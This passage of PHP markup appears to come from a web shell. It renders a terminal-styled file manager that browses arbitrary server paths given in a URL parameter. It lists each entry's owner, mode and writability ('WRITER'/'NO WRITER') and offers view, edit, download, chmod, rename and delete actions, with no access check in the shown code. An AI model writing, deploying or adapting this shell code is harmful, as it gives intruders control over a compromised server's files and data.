<?php } else { ?>
<?php if ($dx_err !== '') { ?>
<div class="sr-row"><?php echo sp_h($dx_err); ?></div>
<?php } ?>
<div style="padding-top:6px"><a class="tbtn" href="?p=<?php echo urlencode($cur); ?>">back</a></div>
<?php } ?>
</div>
<?php } ?>
<?php if ($view_name === '' && $view_err === '' && $edit_name === '' && $edit_err === '' && $cm_name === '' && $cm_err === '' && $rn_name === '' && $rn_err === '' && $rn_msg === '' && $dx_name === '' && $dx_err === '' && $dx_msg === '') { ?>
<div class="term-hdr">[ file manager ]</div>
<div class="tbl-wrap"><table class="tbl">
<tr><th style="width:38%">NAME</th><th style="width:70px">SIZE</th><th style="width:120px">MODIFIED</th><th style="width:100px">OWNER</th><th style="width:60px">MODE</th><th style="width:90px">WRITE</th><th style="width:240px">ACTIONS</th></tr>
<?php foreach ($lt_dirs as $e) {
$fp = rtrim($cur, '/') . '/' . $e;
$m = @filemtime($fp);
$mt = $m ? date('Y-m-d H:i', $m) : '-';
$wr = @is_writable($fp);
?>
<tr><td><a href="?p=<?php echo urlencode($fp); ?>">&#128193; <?php echo sp_h($e); ?></a></td><td class="c">-</td><td class="c"><?php echo sp_h($mt); ?></td><td class="c"><?php echo sp_h(sp_owner($fp)); ?></td><td class="c"><?php echo sp_h(sp_mode($fp)); ?></td><td class="c <?php echo $wr ? 'w-ok' : 'w-no'; ?>"><?php echo $wr ? 'WRITER' : 'NO WRITER'; ?></td><td class="c act"><a class="abtn ab-r" href="?p=<?php echo urlencode($cur); ?>&rn=<?php echo urlencode($e); ?>">RENAME</a><a class="abtn ab-c" href="?p=<?php echo urlencode($cur); ?>&cm=<?php echo urlencode($e); ?>">CHMOD</a><a class="abtn ab-x" href="?p=<?php echo urlencode($cur); ?>&dx=<?php echo urlencode($e); ?>">DELETE</a></td></tr>
<?php } ?>
<?php foreach ($lt_files as $e) {
$fp = rtrim($cur, '/') . '/' . $e;
$sz = sp_size((int)@filesize($fp));
$m = @filemtime($fp);
$mt = $m ? date('Y-m-d H:i', $m) : '-';
$wr = @is_writable($fp);
?>
<tr><td>&#128196; <?php echo sp_h($e); ?></td><td class="c"><?php echo sp_h($sz); ?></td><td class="c"><?php echo sp_h($mt); ?></td><td class="c"><?php echo sp_h(sp_owner($fp)); ?></td><td class="c"><?php echo sp_h(sp_mode($fp)); ?></td><td class="c <?php echo $wr ? 'w-ok' : 'w-no'; ?>"><?php echo $wr ? 'WRITER' : 'NO WRITER'; ?></td><td class="c act"><a class="abtn ab-v" href="?p=<?php echo urlencode($cur); ?>&view=<?php echo urlencode($e); ?>">VIEW</a><a class="abtn ab-e" href="?p=<?php echo urlencode($cur); ?>&edit=<?php echo urlencode($e); ?>">EDIT</a><a class="abtn ab-d" href="?p=<?php echo urlencode($cur); ?>&dl=<?php echo urlencode($e); ?>">DOWNLOAD</a><a class="abtn ab-c" href="?p=<?php echo urlencode($cur); ?>&cm=<?php echo urlencode($e); ?>">CHMOD</a><a class="abtn ab-r" href="?p=<?php echo urlencode($cur); ?>&rn=<?php echo urlencode($e); ?>">RENAME</a><a class="abtn ab-x" href="?p=<?php echo urlencode($cur); ?>&dx=<?php echo urlencode($e); ?>">DELETE</a></td></tr>
<?php } ?>
<?php if (empty($lt_dirs) && empty($lt_files)) { ?>
<tr><td colspan="7" class="c">empty</td></tr>
<?php } ?>
</table></div>
<?php } ?>
</body>
</html>
